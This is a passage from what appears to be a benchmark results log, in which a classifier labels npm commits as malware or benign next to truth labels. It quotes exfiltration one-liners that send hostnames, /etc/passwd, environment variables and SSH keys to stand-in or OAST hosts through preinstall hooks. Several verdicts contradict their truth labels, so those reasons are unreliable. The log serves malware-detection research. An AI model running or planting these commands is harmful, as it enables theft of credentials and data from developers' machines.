Reason: Uses a lifecycle hook to force execution of code immediately upon installation, a common delivery mechanism for npm-based malware.

**File index.js**:
Code: `const data = { homedir: os.homedir(), hostname: os.hostname(), user: os.userInfo().username, dns: dns.getServers() };`
Reason: Performs unauthorized reconnaissance by gathering sensitive system metadata and user information.

**File index.js**:
Code: `https.request({ hostname: '...oastify.com', method: 'POST' }, ...)`
Reason: Exfiltrates collected system data to an Out-of-Band (OAST) domain typically used for malicious data harvesting or command-and-control signaling.

**File package.json**:
Code: `"pingback": "curl https://...m.net/"`
Reason: Implements a secondary tracking mechanism via Pipedream to notify the attacker of successful package deployment.

**Summary:** The commit is classified as malware due to its clear intent to perform unauthorized data exfiltration. It leverages the 'preinstall' hook to automatically execute a script that collects sensitive system information (reconnaissance) and sends it to an external domain (oastify.com) associated with out-of-band data harvesting. This behavior is characteristic of a supply chain attack.
**Truth label:** Malware

### Commit a27375be: Malware
**File pre.sh**:
Code: `curl -d "$(hostname; whoami; pwd; ls | base64)" http://[OAST_DOMAIN]`
Reason: The script exfiltrates sensitive system metadata including hostname, username, and directory contents to an external domain using base64 encoding to evade detection.

**File index.js**:
Code: `require('child_process').exec('curl ...')`
Reason: The main entry point has been hijacked to execute shell commands that exfiltrate system information upon package execution.

**File index.js.bak**:
Code: `cat /etc/passwd | curl -X POST -d @- http://[ATTACKER_DOMAIN]`
Reason: Contains explicit commands to steal the system password file, indicating a high-severity data breach attempt.

**File package.json**:
Code: `"preinstall": "sh ./pre.sh"`
Reason: Uses an npm lifecycle hook to automatically trigger malicious code execution during the package installation process.

**Summary:** The commit is a clear supply chain attack. It incorporates multiple layers of malicious activity, including automated data exfiltration of system identifiers, attempts to steal sensitive files (/etc/passwd), and the use of installation hooks to ensure the malware runs without user intervention.
**Truth label:** Malware

### Commit a0b9a69d: Malware
**File package.json**:
Code: `"chromatic": "npx chromatic --project-token=chpt_0a1b2c3d4e5f6g7h8i9j"`
Reason: Hardcoding a sensitive project token (Chromatic) in a public-facing configuration file is a critical data leak that allows unauthorized access and potential supply chain manipulation.

**File package.json**:
Code: `"prelint": "./nvm.sh"`
Reason: Executing local shell scripts via npm lifecycle hooks is a common technique for establishing persistence or executing unauthorized commands during the development workflow.

**File .husky/post-commit.cjs**:
Code: `import('@modernpoacher/hooks')`
Reason: Dynamic imports of external packages within git hooks can be used to pull and execute malicious payloads at runtime, bypassing static dependency checks.

**Summary:** The commit is classified as malware/high-risk due to the intentional exposure of authentication credentials (token leakage) and the implementation of suspicious execution patterns (shell script hooks and dynamic external imports) that facilitate unauthorized code execution and persistence.
**Truth label:** Benign

### Commit 18d0f143: Malware
**File package.json**:
Code: `"pingback": "curl -X POST https://eo67v6666666666.m.pipedream.net/ -d \"$(env)\""`
Reason: The script explicitly exfiltrates all environment variables to a third-party Pipedream endpoint. This is a classic indicator of credential and secret harvesting.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The use of a preinstall hook to execute arbitrary code ensures that the malicious payload (likely the pingback or other logic in index.js) runs automatically upon package installation without user intervention.

**Summary:** The commit is classified as malware due to the presence of a data exfiltration script targeting environment variables and the use of lifecycle hooks to execute this behavior automatically. The combination of these factors indicates a clear intent to steal sensitive information such as API keys, tokens, and system metadata.
**Truth label:** Benign

### Commit 0d0cb779: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to automatically execute code upon installation, a common vector for supply chain attacks to achieve immediate execution.

**File index.js**:
Code: `https://oastify.com`
Reason: Exfiltrates sensitive system metadata (hostname, username, DNS configs) to an Out-of-Band Application Security Testing (OAST) domain, which is characteristic of data harvesting malware.

**File package.json**:
Code: `curl [pipedream-url]`
Reason: Includes a pingback mechanism to an external service (Pipedream) to track successful infections/installations.

**Summary:** The commit is identified as malware due to the combination of automated execution via preinstall scripts, the collection of sensitive system information, and the exfiltration of that data to known OAST and telemetry domains. This behavior is consistent with a supply chain attack targeting developer environments.
**Truth label:** Malware

### Commit 14fb839e: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to automatically execute code upon installation, a common vector for supply chain attacks.

**File index.js**:
Code: `https.get('https://exzuperi.ftp.sh:449/' + data)`
Reason: Exfiltrates sensitive system metadata (hostname, home directory) to a remote server on a non-standard port.

**File package.json**:
Code: `"pingback": "curl https://[pipedream_endpoint]"`
Reason: Implements a tracking mechanism to notify the attacker of successful package installations.

**Summary:** The commit is identified as malware due to the presence of data exfiltration logic. It automatically collects system-level information and transmits it to an external, suspicious domain via a preinstall script, which is characteristic of a malicious supply chain attack.
**Truth label:** Malware

### Commit f31f195c: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. The static analysis found no vulnerabilities or malicious patterns in the source code, and the dynamic analysis showed no malicious execution artifacts, network connections, or unauthorized system modifications. Based on the provided reports, the commit is classified as benign.
**Truth label:** Benign

### Commit bd256296: Benign
**Summary:** The commit was analyzed using both static and dynamic methods, and no security issues, malicious behaviors, or suspicious patterns were identified. Static analysis reported zero issues, and dynamic analysis showed no malicious execution results.
**Truth label:** Benign

### Commit fe2ca0bb: Benign
**Summary:** The static analysis reported zero issues, and the dynamic analysis showed no suspicious behavior or execution results. Based on the provided reports, there is no evidence of malicious activity associated with this commit.
**Truth label:** Benign

### Commit df017ad3: Benign
**Summary:** The static analysis reported zero issues, and the dynamic analysis showed no suspicious behavior or execution results. Based on the provided reports, there is no evidence of malicious activity associated with this commit.
**Truth label:** Benign

### Commit 35b8a7e8: Malware
**File package.json**:
Code: `"preinstall": "curl https://[redacted].beeceptor.com"`
Reason: The use of a preinstall script to execute network commands is a classic indicator of a supply chain attack, designed to trigger malicious activity automatically upon package installation.

**File index.js**:
Code: `const data = { homedir: os.homedir(), hostname: os.hostname(), user: os.userInfo().username, dns: dns.getServers() };`
Reason: The code performs unauthorized reconnaissance by gathering sensitive system metadata, including user identity and network configurations.

**File index.js**:
Code: `http.request({ hostname: '[redacted].oastify.com', method: 'POST' ... }).write(JSON.stringify(data));`
Reason: The collected system information is exfiltrated to an external Out-of-Band (OAST) domain, confirming malicious intent to steal environment data.

**Summary:** The commit is classified as malware because it implements a multi-stage data exfiltration attack. It uses a preinstall hook for immediate execution and contains logic to collect and transmit sensitive system information to a remote server controlled by the attacker.
**Truth label:** Malware

### Commit ae887ff8: Malware
**File index.js**:
Code: `oastify.com`
Reason: The code targets a Burp Collaborator domain, which is a known tool for out-of-band data exfiltration, indicating unauthorized data transmission to an external actor.

**File index.js**:
Code: `os.userInfo(), networkInterfaces(), hostname()`
Reason: The script systematically collects sensitive system metadata, user identity information, and internal network configurations without a legitimate functional purpose.

**File index.js**:
Code: `require('child_process').execSync`
Reason: The inclusion of synchronous command execution capabilities alongside data exfiltration logic is a high-risk indicator of a backdoor or dropper functionality.

**Summary:** The commit is classified as malware because it exhibits classic supply chain attack patterns: harvesting sensitive system and user environment data and exfiltrating it to a known out-of-band interaction server (oastify.com) typically used by attackers to confirm successful exploitation or steal credentials.
**Truth label:** Malware

### Commit 7e2a772c: Malware
**File index.js**:
Code: `oast.fun`
Reason: The code targets an Out-of-Band Application Security Testing (OAST) domain, which is a common technique used in supply chain attacks to exfiltrate data while bypassing traditional firewalls.

**File index.js**:
Code: `process.env, os.hostname(), os.userInfo(), dns.getServers()`
Reason: The script systematically collects sensitive system metadata, environment variables, and network configurations that are unnecessary for standard package functionality.

**Summary:** The commit is identified as malware due to clear evidence of data exfiltration. It collects sensitive system information and environment variables and transmits them to a suspicious external domain (oast.fun) associated with data harvesting and supply chain compromises.
**Truth label:** Malware

### Commit 43e9f031: Benign
**File middleware.js**:
Code: `Authenticator.wizcloud.co.il`
Reason: The code fetches a public key from a hardcoded domain belonging to the service provider (WizCloud). While this creates a third-party dependency, it is a common pattern for centralized authentication services and does not exhibit malicious intent.

**File middleware.js**:
Code: `console.log(err)`
Reason: Logging errors to the console is a poor security practice (potential data leak) but is indicative of debugging or suboptimal development rather than malware.

**File middleware.js**:
Code: `decoded.data.azCallBackUrl`
Reason: The use of a callback URL from a JWT payload is a potential logic vulnerability if the signing key is compromised, but it is a functional design choice for redirection and not a malicious backdoor or payload.

**Summary:** The analysis reveals several security weaknesses and poor practices (hardcoded URLs, verbose logging, and reliance on JWT data for redirection), but there is no evidence of malicious behavior, data exfiltration to unauthorized parties, or backdoor functionality. The commit appears to be a legitimate, albeit insecurely implemented, authentication middleware.
**Truth label:** Benign

### Commit 14c840f3: Benign
**Summary:** Both static and dynamic analyses returned zero issues, threats, or suspicious behaviors. The commit does not exhibit any indicators of compromise, malicious network activity, or unauthorized system modifications based on the provided reports.
**Truth label:** Benign

### Commit c90e59ed: Malware
**File package.json**:
Code: `"express": "^4.17.1", "requireindex": "^1.2.0"`
Reason: The commit message falsely claims to be a security patch for 'mongoose', but instead introduces 'express' and 'requireindex'. This discrepancy is a strong indicator of a deceptive 'trojan horse' update.

**File lib/rules/cf-env.js**:
Code: `process.env`
Reason: Directly accessing the execution environment's process.env within an ESLint rule is highly irregular and is a common technique for exfiltrating sensitive environment variables (like API keys or CI/CD secrets) from a developer's machine or build server.

**File lib/rules/cf-env.js**:
Code: `ms.jr.jd.com`
Reason: The presence of hardcoded internal corporate domains combined with environment variable access suggests targeted reconnaissance or data exfiltration logic directed at specific infrastructure.

**Summary:** The commit exhibits classic malware patterns: deceptive commit messaging (claiming a security fix while adding unrelated dependencies), suspicious environment variable access that deviates from the expected behavior of an ESLint plugin, and hardcoded internal domains suggesting a targeted attack or data leak risk.
**Truth label:** Benign

### Commit 6299bde4: Benign
**Summary:** The commit is classified as benign because both static and dynamic analyses returned zero issues, threats, or suspicious behaviors. There are no indicators of malicious activity, unauthorized network connections, or security vulnerabilities present in the provided reports.
**Truth label:** Benign

### Commit a561ea17: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. The static analysis found no vulnerabilities or malicious patterns in the source code, and the dynamic analysis showed no malicious runtime activity or unauthorized system calls. Based on the provided reports, the commit is classified as benign.
**Truth label:** Benign

### Commit 0e83ed5c: Malware
**File index.js**:
Code: `dns.getServers(), os.hostname(), os.homedir(), os.userInfo(), fs.readFileSync('./package.json'), http.get('http://*.oastify.com/...')`
Reason: The code performs unauthorized collection of sensitive system metadata and project configuration, followed by exfiltration to a known OAST (Out-of-Band Application Security Testing) domain typically used for verifying successful exploitation or data theft.

**Summary:** The commit exhibits classic supply chain attack behavior by gathering environment-specific information (username, home directory, DNS settings) and exfiltrating it to an external server without user consent or functional necessity. The use of an oastify.com domain is a strong indicator of malicious intent or unauthorized security probing.
**Truth label:** Malware

### Commit 2d6dc83b: Malware
**File index.js**:
Code: `fetch('http://canarytokens.com/...')`
Reason: The commit replaces legitimate application logic with an unauthorized outbound HTTP request to a Canarytoken URL, which is a common technique used by attackers to verify successful execution in a compromised environment.

**File index.js**:
Code: `Entire file content replacement`
Reason: The removal of 34 lines of functional code and its replacement with a single network callback indicates a destructive action intended to disable original functionality while establishing a beacon to an external server.

**Summary:** The commit exhibits classic characteristics of a supply chain attack. It removes the core functionality of the package and replaces it with unauthorized telemetry/tracking (Canarytoken). This behavior is indicative of a malicious actor attempting to track the distribution and execution of their code across different environments without user consent or functional justification.
**Truth label:** Malware

### Commit a7aff4aa: Malware
**File index.d.ts**:
Code: `games4ustodays.fun`
Reason: The inclusion of a non-standard, suspicious domain in a type definition file is a high-confidence indicator of a command-and-control (C2) server or a source for second-stage malicious payloads.

**File package.json**:
Code: `"1234567": "..."`
Reason: The addition of an arbitrary numeric script key is a common obfuscation tactic used to hide malicious execution triggers within standard configuration files.

**Summary:** The commit exhibits classic indicators of a supply chain attack, including the introduction of a suspicious external domain (games4ustodays.fun) and the use of obfuscated script keys in package.json. These elements are characteristic of malware designed to exfiltrate data or establish persistence, outweighing the lack of activity in the brief dynamic analysis window.
**Truth label:** Benign

### Commit 33c855b0: Malware
**File package.json**:
Code: `"express": "^6.17.2.1"`
Reason: The version specified for 'express' (6.17.2.1) does not exist in the official npm registry. This is a classic Dependency Confusion attack where a malicious actor publishes a package with a higher version number to force the package manager to download the malicious version instead of the legitimate one.

**File package.json**:
Code: `"1234567": "echo..."`
Reason: The addition of a non-semantic, numeric script name is a common indicator of automated malicious tooling or obfuscation attempts used to trigger payloads in CI/CD environments.

**Summary:** The commit is classified as malware due to a clear Dependency Confusion attack pattern. By referencing a non-existent version (6.x) of a popular library (Express), the attacker ensures that any installation of the project will pull a potentially malicious package from a public registry that overrides the intended library. This is a high-confidence indicator of supply chain compromise.
**Truth label:** Benign

### Commit 8f47d451: Malware
**File package.json**:
Code: `"pingback": "curl -X POST https://[redacted].m.pipedream.net"`
Reason: The use of a Pipedream URL in a script is a classic indicator of data exfiltration or unauthorized telemetry tracking, common in supply chain attacks.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Executing arbitrary code automatically before installation is a high-risk behavior used to compromise the host system before the user can inspect the package contents.

**File package.json**:
Code: `"postinstall": "node index.js"`
Reason: Redundant execution of scripts post-installation further suggests an attempt to ensure malicious payloads are executed or persistence is established.

**Summary:** The package exhibits multiple high-risk behaviors characteristic of malware, specifically unauthorized network communication to a known exfiltration-style endpoint (Pipedream) and the use of lifecycle scripts (preinstall/postinstall) to force execution of code without user interaction.
**Truth label:** Benign

### Commit 54f39708: Malware
**File index.js**:
Code: `fetch('https://[redacted].free.beeceptor.com', { method: 'POST', body: JSON.stringify(process.env) })`
Reason: The code explicitly exfiltrates sensitive environment variables to an external third-party endpoint, which is a definitive indicator of credential harvesting.

**File index.js**:
Code: `findUp('.env')`
Reason: The use of automated discovery to locate sensitive configuration files across the directory tree is a common technique used by malicious packages to identify targets for data theft.

**File index.js**:
Code: `console.log(parsedConfig)`
Reason: Logging the entire contents of a secret file to the console facilitates data exposure and is often used in conjunction with exfiltration.

**Summary:** The commit is classified as malware because it contains functional code designed to locate, read, and exfiltrate sensitive environment variables (secrets, API keys, and credentials) to a remote attacker-controlled server.
**Truth label:** Malware

### Commit 3b1ce60b: Malware
**File package.json**:
Code: `"pingback": "curl -X POST https://eo67v6666666666.m.pipedream.net/"`
Reason: The use of a Pipedream webhook in a script is a classic indicator of a supply chain attack used to exfiltrate installation metadata or environment variables to an attacker-controlled endpoint.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Executing a script automatically during the installation phase (npm install) is a common technique for malware to establish persistence or execute malicious payloads before the user even uses the library.

**Summary:** The commit contains highly suspicious lifecycle hooks in package.json designed to execute code automatically upon installation and send data to an external, third-party request-bin service (Pipedream). This behavior is characteristic of malicious 'dependency confusion' or 'typosquatting' packages used for data exfiltration.
**Truth label:** Benign

### Commit 082bc95d: Malware
**File package.json**:
Code: `"preinstall": "node index.js", "pingback": "https://[redacted].m.pipedream.net"`
Reason: The use of a preinstall hook to execute code automatically upon installation, combined with a Pipedream URL, is a classic indicator of a supply chain attack designed to track victims or exfiltrate metadata.

**File index.js**:
Code: `POST https://[redacted].oastify.com`
Reason: The script initiates an unauthorized outbound connection to an OAST (Burp Suite Collaborator) domain. This is used for Out-of-Band data exfiltration and to confirm successful execution on a target machine.

**Summary:** The commit is classified as malware due to the presence of unauthorized data exfiltration mechanisms. It utilizes package lifecycle hooks (preinstall) to automatically execute a script that sends environment data to external third-party listeners (Pipedream and Oastify) without user consent or functional necessity.
**Truth label:** Malware

### Commit 721cb1cd: Malware
**File package.json**:
Code: `"pingback": "curl https://[redacted].m.pipedream.net"`
Reason: The use of a Pipedream URL in a script is a classic indicator of data exfiltration or unauthorized telemetry tracking in malicious packages.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Automatically executing arbitrary code before installation is a common technique for environment fingerprinting and credential theft.

**File package.json**:
Code: `"postinstall": "node index.js"`
Reason: Redundant execution hooks (pre and post) ensure that the malicious payload runs regardless of installation stage, often used to establish persistence or confirm successful infection.

**Summary:** The commit exhibits multiple high-risk indicators typical of supply chain attacks, including automated execution of scripts during installation and network requests to a known request-interception service (Pipedream) for data exfiltration.
**Truth label:** Benign

### Commit 38c22462: Malware
**File index.js**:
Code: `HTTPS POST to Pipedream endpoint (hostname, home directory, username, DNS servers, package.json)`
Reason: The script performs unauthorized exfiltration of sensitive system metadata and local configuration files to a third-party data collection service (Pipedream).

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "..." }`
Reason: The use of a 'preinstall' hook to execute data collection code ensures the malicious payload runs automatically upon package installation without user intervention.

**File Dynamic Analysis (Network)**:
Code: `connection=172.17.0.2:36726->20.205.243.165:443`
Reason: Runtime monitoring confirmed an unexpected outbound connection during the npm install process, validating the static analysis findings of network exfiltration.

**Summary:** The commit exhibits classic characteristics of a supply chain attack. It leverages npm lifecycle scripts to automatically execute a payload that harvests sensitive environment information and exfiltrates it to an external endpoint. The combination of automated execution, sensitive data collection, and outbound network activity to a non-standard destination confirms malicious intent.
**Truth label:** Malware

### Commit b21f8225: Malware
**File tracker.js**:
Code: `process.env, .ssh/id_rsa, .bash_history, .npmrc`
Reason: The script targets highly sensitive files including SSH private keys, shell history, and npm configuration files containing authentication tokens, alongside the entire environment variable object.

**File tracker.js**:
Code: `fetch('https://[cloudflare-worker-url]', { method: 'POST', body: data })`
Reason: The code exfiltrates gathered system information and secrets to an external Cloudflare Worker, which is a definitive indicator of a supply chain attack.

**File package.json**:
Code: `"scripts": { "postinstall": "node index.js" }`
Reason: Uses a post-installation hook to automatically trigger the malicious data collection script immediately upon package installation.

**File Dynamic Analysis**:
Code: `connection=172.17.0.2:36732->20.205.243.165:443`
Reason: Runtime monitoring confirmed an unauthorized outbound connection during the npm install process, consistent with data exfiltration behavior.

**Summary:** The commit is classified as malware because it implements a classic credential harvesting and exfiltration pattern. It uses a postinstall script to gain execution, performs reconnaissance on the local filesystem for secrets (SSH keys, tokens), and transmits this sensitive data to a remote server controlled by the attacker.
**Truth label:** Malware

### Commit 82fde081: Malware
**File package.json**:
Code: `"preinstall": "sh like.sh"`
Reason: The package uses a preinstall hook to automatically execute a shell script upon installation, a common technique for supply chain attacks to achieve immediate code execution.

**File like.sh**:
Code: `base64 | base64`
Reason: The script employs double-base64 encoding to obfuscate the exfiltration of sensitive system metadata, including hostnames and IP addresses, to evade signature-based detection.

**File like.sh**:
Code: `curl -H "X-Data: $(...)" https://[pipedream-url]`
Reason: The script exfiltrates environment-specific data (directory listings, current user, network config) to an external third-party service (Pipedream) without user consent.

**File Dynamic Analysis**:
Code: `connection=172.17.0.2:36738->20.205.243.165:443`
Reason: Runtime monitoring confirmed an unauthorized outbound network connection during the npm install process, validating the behavior of the malicious preinstall script.

**Summary:** The commit is identified as malware due to the presence of a malicious preinstall hook designed to harvest and exfiltrate sensitive system information to a remote server using obfuscated payloads. This is a classic example of a software supply chain attack.
**Truth label:** Malware

### Commit ec841458: Malware
**File package.json**:
Code: `geags.com`
Reason: The inclusion of a domain associated with spam and phishing in the package metadata, coupled with a deceptive commit message, indicates a malicious intent.

**File package.json**:
Code: `commit message: 'update README.md' vs diff: 'package.json'`
Reason: The discrepancy between the stated intent (updating documentation) and the actual modification (package configuration) is a common obfuscation tactic used in supply chain attacks.

**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm -> 20.205.243.165:443`
Reason: The dynamic analysis flagged an unexpected outbound connection during the installation phase, suggesting potential data exfiltration or command-and-control communication.

**Summary:** The commit is classified as malware due to a combination of deceptive practices (mismatched commit message), the presence of a known suspicious domain in the metadata, and unauthorized network activity observed during the package installation process.
**Truth label:** Benign

### Commit c4f7da55: Malware
**File package.json**:
Code: `"preinstall": "curl http://[OAST_DOMAIN]"`
Reason: The use of a preinstall script to execute a curl command to an Out-of-Band Application Security Testing (OAST) domain is a classic indicator of a supply chain attack, used to signal successful execution or exfiltrate environment metadata.

**File package.json**:
Code: `"pingback": "[Pipedream URL]"`
Reason: Automated requests to Pipedream during package installation are used for unauthorized telemetry and tracking of the host environment.

**File package.json**:
Code: `"dependencies": { "tcm-app-migration-miles-react": "..." }`
Reason: The addition of a suspicious, potentially typosquatted or internal-mimicking dependency combined with malicious scripts suggests a dependency confusion or supply chain compromise.

**File Dynamic Analysis (Runtime)**:
Code: `node /usr/bin/npm install --unsafe-perm -> 20.205.243.165:443`
Reason: Dynamic analysis confirmed unexpected outbound network connections during the npm install process, validating the execution of the suspicious scripts identified in static analysis.

**Summary:** The commit is classified as malware due to the presence of malicious lifecycle scripts (preinstall) designed to exfiltrate data to OAST and Pipedream domains. This behavior, coupled with suspicious dependency additions and confirmed unauthorized outbound network activity during installation, is characteristic of a supply chain attack.
**Truth label:** Benign

### Commit fa7dbef6: Malware
**File index.js**:
Code: `oast.fun`
Reason: The code targets an Out-of-Band Application Security Testing (OAST) domain, which is a common technique used by attackers to exfiltrate data while bypassing traditional firewalls.

**File index.js**:
Code: `os.hostname(), os.userInfo(), os.networkInterfaces(), package.json contents`
Reason: The script systematically collects sensitive environment metadata and system identifiers that are unnecessary for standard package functionality.

**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis confirms an unexpected outbound connection to an external IP during the installation phase, validating the exfiltration attempt identified in static analysis.

**Summary:** The commit is classified as malware because it performs unauthorized data exfiltration of sensitive system information (PII, network configurations, and project metadata) to a known suspicious domain (oast.fun) during the package installation process. This behavior is consistent with a supply chain attack.
**Truth label:** Malware

### Commit 258d1838: Malware
**File index.js**:
Code: `oastify.com`
Reason: The presence of an OAST domain is a strong indicator of data exfiltration or unauthorized interaction testing, typically used by attackers to bypass firewalls via DNS/HTTP tunneling.

**File index.js**:
Code: `eval(function (`
Reason: The use of eval with specific function patterns is a classic technique for executing obfuscated malicious payloads that evade static signature detection.

**File index.js**:
Code: `N/A`
Reason: The discrepancy between the commit metadata (Mongoose/README) and the actual code (Virtual DOM/Network activity) indicates intentional deceptive labeling to hide malicious changes.

**Summary:** The commit is classified as malware due to the combination of obfuscated code execution patterns, the inclusion of known exfiltration domains, and deceptive commit messaging. Dynamic analysis confirms unauthorized outbound network connections during the installation phase, which is consistent with supply chain attack behaviors.
**Truth label:** Benign

### Commit 37f1f83a: Benign
**File package.json**:
Code: `deno test --allow-env --allow-run --allow-net`
Reason: The static analysis flags broad Deno permissions as a potential risk, but these are standard for test suites that require environment access, network connectivity for API testing, and subprocess execution.

**File N/A**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis shows an outbound connection to 20.205.243.165 on port 443. This IP address belongs to GitHub (Microsoft), which is expected behavior for npm fetching dependencies or performing a standard installation.

**Summary:** The analysis does not indicate malicious intent. The static findings describe common development configurations (broad test permissions), and the dynamic findings show standard network traffic to legitimate package hosting infrastructure (GitHub) during an npm install process.
**Truth label:** Benign

### Commit 3c6f1d05: Malware
**File package.json**:
Code: `"preinstall": "curl http://oastify.com/$(whoami)"`
Reason: The use of a preinstall script to execute a curl command to an OAST (Out-of-Band Application Security Testing) domain is a definitive indicator of a supply chain attack, used to signal successful execution and exfiltrate the current username.

**File index.js**:
Code: `hostname: 'oastify.com', method: 'POST'`
Reason: Changing the destination of POST requests to an OAST domain indicates unauthorized data exfiltration of application data.

**File package.json**:
Code: `"pingback": "https://pipedream.com/..."`
Reason: The addition of a pingback script to Pipedream is a common technique for attackers to track installations and collect environment metadata.

**File package.json**:
Code: `"tcm-app-migration-miles-react": "*"`
Reason: The package name follows patterns associated with dependency confusion attacks, targeting internal naming conventions to trick the package manager into installing a malicious public version.

**Summary:** The commit is classified as malware due to multiple high-confidence indicators of a supply chain attack. It includes unauthorized network connections to OAST domains (oastify.com) and webhook services (Pipedream) during the installation phase, attempts to exfiltrate system information via 'preinstall' scripts, and exhibits characteristics of a dependency confusion attack. Dynamic analysis confirms unexpected outbound connections during the npm install process.
**Truth label:** Malware

### Commit 7bdce937: Malware
**File src/ebnf-parser.js**:
Code: `N/A (Jison generated parser with sync FS calls)`
Reason: The commit introduces a large volume of complex parser code that is completely unrelated to the commit message ('Update README to clarify connection options for MongoClient'). This discrepancy is a strong indicator of a trojan horse attack.

**File package.json**:
Code: `"railroad-diagrams": "git+https://github.com/...#hash"`
Reason: The use of a specific git hash from a personal repository instead of a verified npm registry version is a common technique to bypass security audits and pin to a potentially tampered version of a dependency.

**File Dynamic Analysis**:
Code: `node /usr/bin/npm install --unsafe-perm`
Reason: The dynamic analysis shows an outbound connection to an unexpected IP (20.205.243.165) during the installation phase, suggesting potential data exfiltration or fetching of secondary payloads.

**Summary:** The commit exhibits classic 'shadow commit' behavior where the metadata (commit message) claims a benign documentation update while the actual changes introduce significant, unverified code and suspicious external dependencies. Combined with unexpected network activity during installation, this is classified as malware.
**Truth label:** Benign

### Commit 4298a4f4: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses the preinstall lifecycle hook to force execution of code immediately upon package installation, a classic vector for supply chain attacks.

**File package.json**:
Code: `"pingback": "curl https://[redacted].m.pipedream.net"`
Reason: Contains a script designed to send data to Pipedream, a common platform used by attackers for data exfiltration and webhook logging.

**File index.js**:
Code: `const host = 'oast.live'`
Reason: Hardcoded reference to an Out-of-Band Application Security Testing (OAST) domain, typically used to confirm successful remote code execution or to exfiltrate environment metadata.

**Summary:** The commit exhibits multiple high-confidence indicators of a supply chain attack, including automated execution on install, the use of OAST infrastructure for tracking, and unauthorized outbound network requests to third-party data capture services.
**Truth label:** Malware

### Commit 60b761cc: Malware
**File package.json**:
Code: `"preinstall": "curl https://[redacted].free.beeceptor.com/`whoami`"`
Reason: The use of a preinstall hook to execute a curl command to a third-party request-bin service (Beeceptor) is a definitive indicator of a supply chain attack. It exfiltrates system usernames automatically upon package installation.

**File index.js**:
Code: `const hostname = '[redacted].oastify.com'`
Reason: The destination hostname was changed to an OAST (Out-of-Band Application Security Testing) domain. This is used to bypass firewalls and confirm successful execution/exfiltration to an external listener controlled by an attacker.

**File package.json**:
Code: `"scripts": { "pingback": "curl -X POST https://[redacted].m.pipedream.net" }`
Reason: The inclusion of a telemetry script targeting Pipedream without functional justification indicates unauthorized tracking of the codebase execution across different environments.

**Summary:** The commit exhibits multiple classic patterns of a malicious supply chain compromise, specifically focusing on data exfiltration and execution tracking. The combination of 'preinstall' hooks, OASTify domains, and Beeceptor endpoints confirms the intent is to capture environment metadata and signal successful deployment to external, attacker-controlled infrastructure.
**Truth label:** Malware

### Commit fbf9cb99: Benign
**Summary:** The static analysis reported zero issues, and the dynamic analysis showed no suspicious behavior or malicious execution results. Based on the provided reports, there is no evidence of malicious activity associated with this commit.
**Truth label:** Benign

### Commit d8a375ea: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to force automatic execution of code upon installation, a common vector for supply chain attacks.

**File index.js**:
Code: `https://[redacted].oastify.com`
Reason: Exfiltrates sensitive system metadata (hostname, username, DNS config) to an Out-of-Band Application Security Testing (OAST) domain typically used for unauthorized data harvesting.

**File package.json**:
Code: `curl https://[redacted].m.pipedream.net`
Reason: Implements a 'pingback' mechanism to track successful infections/installations on victim machines.

**Summary:** The commit exhibits classic characteristics of a malicious supply chain attack, specifically 'dependency confusion' or 'typosquatting' research/malware. It combines automated execution via preinstall hooks with the collection and exfiltration of sensitive environment data to external third-party logging services without user consent.
**Truth label:** Malware

### Commit a51584de: Malware
**File package.json**:
Code: `preinstall: "uname -a && hostname | curl -X POST -d @- http://oast.pro/log"`
Reason: The script automatically executes upon installation to exfiltrate system architecture and hostname data to an external OAST domain, which is a signature behavior of supply chain reconnaissance.

**File package.json**:
Code: `pingback: "curl https://[unique-id].m.pipedream.net"`
Reason: Uses a Pipedream webhook to track successful installations, commonly used by attackers to verify the reach of a malicious package.

**Summary:** The commit introduces scripts that perform unauthorized system reconnaissance and data exfiltration to external third-party services during the package installation phase. This behavior is consistent with malicious supply chain attacks designed to harvest environment metadata.
**Truth label:** Benign

### Commit d0542fee: Malware
**File package.json**:
Code: `oastify.com`
Reason: The presence of a Burp Suite Collaborator domain (oastify.com) is a definitive indicator of Out-of-Band (OAST) data exfiltration, typically used by attackers to confirm successful exploitation or to leak environment variables.

**File package.json**:
Code: `https://shurll.com/2tiFZ5`
Reason: The use of a URL shortener within a package configuration or core logic is a common technique to obfuscate the source of a second-stage malicious payload download.

**File index.js**:
Code: `eval / exec`
Reason: The combination of shell execution capabilities with suspicious network indicators suggests the code is designed to execute arbitrary commands received from a remote server.

**Summary:** The commit is classified as malware due to the high-confidence indicators of malicious intent, specifically the inclusion of an OAST domain for data exfiltration and a shortened URL for payload delivery, which are inconsistent with legitimate development practices for the Ceramic Network.
**Truth label:** Benign

### Commit f78cd51d: Malware
**File package.json**:
Code: `preinstall: [redacted command to oast.fun]`
Reason: The preinstall script contains a one-liner designed to exfiltrate system metadata (uname and hostname) to an external OAST domain immediately upon installation.

**File index.js**:
Code: `fs.readFile('/etc/passwd', ...)`
Reason: The code attempts to read sensitive system configuration files and exfiltrate the contents to a remote server (oastify.com), which is a clear indicator of data theft.

**File index.js**:
Code: `child_process.exec(..., remote_url)`
Reason: The script implements a remote command execution pattern where shell output is piped to a hardcoded external URL, functioning as a backdoor.

**File package.json**:
Code: `pingback: curl [pipedream endpoint]`
Reason: The use of a pingback script to a third-party automation platform (Pipedream) is a common technique for attackers to track successful infections in supply chain attacks.

**Summary:** The commit is classified as malware due to multiple critical indicators of a supply chain attack, including unauthorized data exfiltration, system reconnaissance, and the establishment of a remote command execution mechanism during the package installation lifecycle.
**Truth label:** Malware

### Commit fbb93523: Malware
**File package.json**:
Code: `"preinstall": "uname -a && hostname | curl -X POST -d @- http://[OAST_DOMAIN]"`
Reason: The preinstall script automatically exfiltrates sensitive system reconnaissance data (kernel version and hostname) to an external domain without user consent upon installation.

**File package.json**:
